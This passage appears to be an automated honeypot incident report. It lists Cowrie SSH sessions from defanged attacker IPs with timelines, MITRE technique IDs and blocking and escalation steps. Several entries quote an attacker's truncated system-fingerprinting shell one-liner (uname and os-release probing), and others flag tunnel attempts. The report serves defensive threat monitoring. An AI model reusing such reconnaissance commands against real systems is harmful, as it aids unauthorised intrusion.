| `2026-07-24 16:42:22` | `cowrie.command.input` |
| `2026-07-24 16:42:23` | `cowrie.log.closed` |
| `2026-07-24 16:42:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-85f46b88132d

| Field | Detail |
|---|---|
| **Source IP** | `178.178.222[.]53` |
| **First Seen** | 2026-07-24 16:42 |
| **Last Seen** | 2026-07-24 16:42 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 16:42:49` | `cowrie.session.connect` |
| `2026-07-24 16:42:49` | `cowrie.client.version` |
| `2026-07-24 16:42:49` | `cowrie.client.kex` |
| `2026-07-24 16:42:50` | `cowrie.login.success` |
| `2026-07-24 16:42:51` | `cowrie.direct-tcpip.request` |
| `2026-07-24 16:42:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `178.178.222[.]53` to AbuseIPDB if not already reported
- [ ] Block `178.178.222[.]53` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b917d0d45d91

| Field | Detail |
|---|---|
| **Source IP** | `65.20.153[.]146` |
| **First Seen** | 2026-07-24 16:42 |
| **Last Seen** | 2026-07-24 16:43 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 16:42:56` | `cowrie.session.connect` |
| `2026-07-24 16:42:56` | `cowrie.client.version` |
| `2026-07-24 16:42:56` | `cowrie.client.kex` |
| `2026-07-24 16:42:58` | `cowrie.login.success` |
| `2026-07-24 16:42:58` | `cowrie.direct-tcpip.request` |
| `2026-07-24 16:43:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `65.20.153[.]146` to AbuseIPDB if not already reported
- [ ] Block `65.20.153[.]146` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ab9386f5f7e4

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-24 16:43 |
| **Last Seen** | 2026-07-24 16:43 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 16:43:41` | `cowrie.session.connect` |
| `2026-07-24 16:43:41` | `cowrie.client.version` |
| `2026-07-24 16:43:41` | `cowrie.client.kex` |
| `2026-07-24 16:43:43` | `cowrie.login.success` |
| `2026-07-24 16:43:44` | `cowrie.session.params` |
| `2026-07-24 16:43:44` | `cowrie.command.input` |
| `2026-07-24 16:43:44` | `cowrie.command.input` |
| `2026-07-24 16:43:44` | `cowrie.command.input` |
| `2026-07-24 16:43:44` | `cowrie.command.input` |
| `2026-07-24 16:43:44` | `cowrie.command.input` |
| `2026-07-24 16:43:44` | `cowrie.command.success` |
| `2026-07-24 16:43:44` | `cowrie.command.input` |
| `2026-07-24 16:43:44` | `cowrie.command.input` |
| `2026-07-24 16:43:44` | `cowrie.command.input` |
| `2026-07-24 16:43:44` | `cowrie.command.input` |
| `2026-07-24 16:43:45` | `cowrie.log.closed` |
| `2026-07-24 16:43:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cf6fafea3333

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-24 16:45 |
| **Last Seen** | 2026-07-24 16:45 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 16:45:03` | `cowrie.session.connect` |
| `2026-07-24 16:45:04` | `cowrie.client.version` |
| `2026-07-24 16:45:04` | `cowrie.client.kex` |
| `2026-07-24 16:45:06` | `cowrie.login.success` |
| `2026-07-24 16:45:07` | `cowrie.session.params` |
| `2026-07-24 16:45:07` | `cowrie.command.input` |
| `2026-07-24 16:45:07` | `cowrie.command.input` |
| `2026-07-24 16:45:07` | `cowrie.command.input` |
| `2026-07-24 16:45:07` | `cowrie.command.input` |
| `2026-07-24 16:45:07` | `cowrie.command.input` |
| `2026-07-24 16:45:07` | `cowrie.command.success` |
| `2026-07-24 16:45:07` | `cowrie.command.input` |
| `2026-07-24 16:45:07` | `cowrie.command.input` |
| `2026-07-24 16:45:07` | `cowrie.command.input` |
| `2026-07-24 16:45:07` | `cowrie.command.input` |
| `2026-07-24 16:45:07` | `cowrie.log.closed` |
| `2026-07-24 16:45:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d08423f7d9bc

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-24 16:46 |
| **Last Seen** | 2026-07-24 16:46 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 16:46:24` | `cowrie.session.connect` |
| `2026-07-24 16:46:25` | `cowrie.client.version` |
| `2026-07-24 16:46:25` | `cowrie.client.kex` |
| `2026-07-24 16:46:27` | `cowrie.login.success` |
| `2026-07-24 16:46:28` | `cowrie.session.params` |
| `2026-07-24 16:46:28` | `cowrie.command.input` |
| `2026-07-24 16:46:28` | `cowrie.command.input` |
| `2026-07-24 16:46:28` | `cowrie.command.input` |
| `2026-07-24 16:46:28` | `cowrie.command.input` |
| `2026-07-24 16:46:28` | `cowrie.command.input` |
| `2026-07-24 16:46:28` | `cowrie.command.success` |
| `2026-07-24 16:46:28` | `cowrie.command.input` |
| `2026-07-24 16:46:28` | `cowrie.command.input` |
| `2026-07-24 16:46:28` | `cowrie.command.input` |
| `2026-07-24 16:46:28` | `cowrie.command.input` |
| `2026-07-24 16:46:29` | `cowrie.log.closed` |
| `2026-07-24 16:46:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3385f162da37

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-24 16:47 |
| **Last Seen** | 2026-07-24 16:47 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 16:47:46` | `cowrie.session.connect` |
| `2026-07-24 16:47:47` | `cowrie.client.version` |
| `2026-07-24 16:47:47` | `cowrie.client.kex` |
| `2026-07-24 16:47:49` | `cowrie.login.success` |
| `2026-07-24 16:47:50` | `cowrie.session.params` |
| `2026-07-24 16:47:50` | `cowrie.command.input` |
| `2026-07-24 16:47:50` | `cowrie.command.input` |
| `2026-07-24 16:47:50` | `cowrie.command.input` |
| `2026-07-24 16:47:50` | `cowrie.command.input` |
| `2026-07-24 16:47:50` | `cowrie.command.input` |
| `2026-07-24 16:47:50` | `cowrie.command.success` |
| `2026-07-24 16:47:50` | `cowrie.command.input` |
| `2026-07-24 16:47:50` | `cowrie.command.input` |
| `2026-07-24 16:47:50` | `cowrie.command.input` |
| `2026-07-24 16:47:50` | `cowrie.command.input` |
| `2026-07-24 16:47:51` | `cowrie.log.closed` |
| `2026-07-24 16:47:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5a9fe215b407

| Field | Detail |
|---|---|
| **Source IP** | `200.232.114[.]71` |
| **First Seen** | 2026-07-24 16:48 |
| **Last Seen** | 2026-07-24 16:48 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 16:48:28` | `cowrie.session.connect` |
| `2026-07-24 16:48:29` | `cowrie.client.version` |
| `2026-07-24 16:48:29` | `cowrie.client.kex` |
| `2026-07-24 16:48:31` | `cowrie.login.success` |
| `2026-07-24 16:48:31` | `cowrie.direct-tcpip.request` |
| `2026-07-24 16:48:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `200.232.114[.]71` to AbuseIPDB if not already reported
- [ ] Block `200.232.114[.]71` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-73bcdb3c1636

| Field | Detail |
|---|---|
| **Source IP** | `65.20.204[.]88` |
| **First Seen** | 2026-07-24 16:48 |
| **Last Seen** | 2026-07-24 16:48 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 16:48:37` | `cowrie.session.connect` |
| `2026-07-24 16:48:37` | `cowrie.client.version` |
| `2026-07-24 16:48:37` | `cowrie.client.kex` |
| `2026-07-24 16:48:38` | `cowrie.login.success` |
| `2026-07-24 16:48:39` | `cowrie.direct-tcpip.request` |
| `2026-07-24 16:48:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `65.20.204[.]88` to AbuseIPDB if not already reported
- [ ] Block `65.20.204[.]88` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2bf375d466a5

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-24 16:49 |
| **Last Seen** | 2026-07-24 16:49 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 16:49:06` | `cowrie.session.connect` |
| `2026-07-24 16:49:07` | `cowrie.client.version` |
| `2026-07-24 16:49:07` | `cowrie.client.kex` |
| `2026-07-24 16:49:08` | `cowrie.login.success` |
| `2026-07-24 16:49:10` | `cowrie.session.params` |
| `2026-07-24 16:49:10` | `cowrie.command.input` |
| `2026-07-24 16:49:10` | `cowrie.command.input` |
| `2026-07-24 16:49:10` | `cowrie.command.input` |
| `2026-07-24 16:49:10` | `cowrie.command.input` |
| `2026-07-24 16:49:10` | `cowrie.command.input` |
| `2026-07-24 16:49:10` | `cowrie.command.success` |
| `2026-07-24 16:49:10` | `cowrie.command.input` |
| `2026-07-24 16:49:10` | `cowrie.command.input` |
| `2026-07-24 16:49:10` | `cowrie.command.input` |
| `2026-07-24 16:49:10` | `cowrie.command.input` |
| `2026-07-24 16:49:10` | `cowrie.log.closed` |
| `2026-07-24 16:49:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-24533e252854

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-24 16:50 |
| **Last Seen** | 2026-07-24 16:50 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 16:50:29` | `cowrie.session.connect` |
| `2026-07-24 16:50:29` | `cowrie.client.version` |
| `2026-07-24 16:50:29` | `cowrie.client.kex` |
| `2026-07-24 16:50:31` | `cowrie.login.success` |
| `2026-07-24 16:50:32` | `cowrie.session.params` |
| `2026-07-24 16:50:32` | `cowrie.command.input` |
| `2026-07-24 16:50:32` | `cowrie.command.input` |
| `2026-07-24 16:50:32` | `cowrie.command.input` |
| `2026-07-24 16:50:32` | `cowrie.command.input` |
| `2026-07-24 16:50:32` | `cowrie.command.input` |
| `2026-07-24 16:50:32` | `cowrie.command.success` |
| `2026-07-24 16:50:32` | `cowrie.command.input` |
| `2026-07-24 16:50:32` | `cowrie.command.input` |
| `2026-07-24 16:50:32` | `cowrie.command.input` |
| `2026-07-24 16:50:32` | `cowrie.command.input` |
| `2026-07-24 16:50:33` | `cowrie.log.closed` |
| `2026-07-24 16:50:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7b3614556268

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-24 16:51 |
| **Last Seen** | 2026-07-24 16:51 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 16:51:52` | `cowrie.session.connect` |
| `2026-07-24 16:51:52` | `cowrie.client.version` |
| `2026-07-24 16:51:52` | `cowrie.client.kex` |
| `2026-07-24 16:51:53` | `cowrie.login.success` |
| `2026-07-24 16:51:54` | `cowrie.session.params` |
| `2026-07-24 16:51:54` | `cowrie.command.input` |
| `2026-07-24 16:51:54` | `cowrie.command.input` |
| `2026-07-24 16:51:54` | `cowrie.command.input` |
| `2026-07-24 16:51:54` | `cowrie.command.input` |
| `2026-07-24 16:51:54` | `cowrie.command.input` |
| `2026-07-24 16:51:54` | `cowrie.command.success` |
| `2026-07-24 16:51:54` | `cowrie.command.input` |
| `2026-07-24 16:51:54` | `cowrie.command.input` |
| `2026-07-24 16:51:54` | `cowrie.command.input` |
| `2026-07-24 16:51:54` | `cowrie.command.input` |
| `2026-07-24 16:51:55` | `cowrie.log.closed` |
| `2026-07-24 16:51:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cfb83980c92f

| Field | Detail |
|---|---|
| **Source IP** | `90.228.229[.]182` |
| **First Seen** | 2026-07-24 16:51 |
| **Last Seen** | 2026-07-24 16:52 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 16:51:56` | `cowrie.session.connect` |
| `2026-07-24 16:51:56` | `cowrie.client.version` |
| `2026-07-24 16:51:56` | `cowrie.client.kex` |
| `2026-07-24 16:51:57` | `cowrie.login.success` |
| `2026-07-24 16:51:57` | `cowrie.direct-tcpip.request` |
| `2026-07-24 16:52:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `90.228.229[.]182` to AbuseIPDB if not already reported
- [ ] Block `90.228.229[.]182` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e40883a01219

| Field | Detail |
|---|---|
| **Source IP** | `189.56.0[.]19` |
| **First Seen** | 2026-07-24 16:52 |
| **Last Seen** | 2026-07-24 16:52 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 16:52:44` | `cowrie.session.connect` |
| `2026-07-24 16:52:46` | `cowrie.client.version` |
| `2026-07-24 16:52:46` | `cowrie.client.kex` |
| `2026-07-24 16:52:54` | `cowrie.login.success` |
| `2026-07-24 16:52:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `189.56.0[.]19` to AbuseIPDB if not already reported
- [ ] Block `189.56.0[.]19` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-212f18ea7fac

| Field | Detail |
|---|---|
| **Source IP** | `200.199.32[.]174` |
| **First Seen** | 2026-07-24 16:52 |
| **Last Seen** | 2026-07-24 16:53 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 16:52:54` | `cowrie.session.connect` |
| `2026-07-24 16:52:55` | `cowrie.client.version` |
| `2026-07-24 16:52:55` | `cowrie.client.kex` |
| `2026-07-24 16:52:57` | `cowrie.login.success` |
| `2026-07-24 16:52:57` | `cowrie.direct-tcpip.request` |
| `2026-07-24 16:53:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `200.199.32[.]174` to AbuseIPDB if not already reported
- [ ] Block `200.199.32[.]174` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d563bd9669db

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-24 16:53 |
| **Last Seen** | 2026-07-24 16:53 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 16:53:17` | `cowrie.session.connect` |
| `2026-07-24 16:53:18` | `cowrie.client.version` |
| `2026-07-24 16:53:18` | `cowrie.client.kex` |
| `2026-07-24 16:53:19` | `cowrie.login.success` |
| `2026-07-24 16:53:20` | `cowrie.session.params` |
| `2026-07-24 16:53:20` | `cowrie.command.input` |
| `2026-07-24 16:53:20` | `cowrie.command.input` |
| `2026-07-24 16:53:20` | `cowrie.command.input` |
| `2026-07-24 16:53:20` | `cowrie.command.input` |
| `2026-07-24 16:53:20` | `cowrie.command.input` |
| `2026-07-24 16:53:20` | `cowrie.command.success` |
| `2026-07-24 16:53:20` | `cowrie.command.input` |
| `2026-07-24 16:53:20` | `cowrie.command.input` |
| `2026-07-24 16:53:20` | `cowrie.command.input` |
| `2026-07-24 16:53:20` | `cowrie.command.input` |
| `2026-07-24 16:53:21` | `cowrie.log.closed` |
| `2026-07-24 16:53:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2511e0549b89

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-24 16:54 |
| **Last Seen** | 2026-07-24 16:54 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 16:54:42` | `cowrie.session.connect` |
| `2026-07-24 16:54:42` | `cowrie.client.version` |
| `2026-07-24 16:54:42` | `cowrie.client.kex` |
| `2026-07-24 16:54:43` | `cowrie.login.success` |
| `2026-07-24 16:54:45` | `cowrie.session.params` |
| `2026-07-24 16:54:45` | `cowrie.command.input` |
| `2026-07-24 16:54:45` | `cowrie.command.input` |
| `2026-07-24 16:54:45` | `cowrie.command.input` |
| `2026-07-24 16:54:45` | `cowrie.command.input` |
